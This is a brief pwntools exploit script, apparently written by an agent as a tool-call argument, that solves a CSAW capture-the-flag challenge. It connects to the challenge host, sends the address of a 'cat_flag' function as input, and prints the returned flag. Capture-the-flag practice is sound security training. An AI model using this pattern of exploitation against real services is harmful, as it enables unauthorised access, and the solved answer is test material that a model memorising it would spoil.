parsed_args.contents:
from pwn import *

# Target remote connection
target = ('pwn.chal.csaw.io', 31138)

# Connect to remote service
conn = remote(*target)

# Wait for prompt (optional, will print the first chunk)
data = conn.recvuntil(b'input', drop=False)
print(data.decode(errors='ignore'))

# The address to input (sym.cat_flag): 0x400717
payload = b'400717\n'

# Send the payload
conn.send(payload)

# Wait for and capture response (including flag)
result = conn.recvall(timeout=5)
print(result.decode(errors='ignore'))

conn.close()
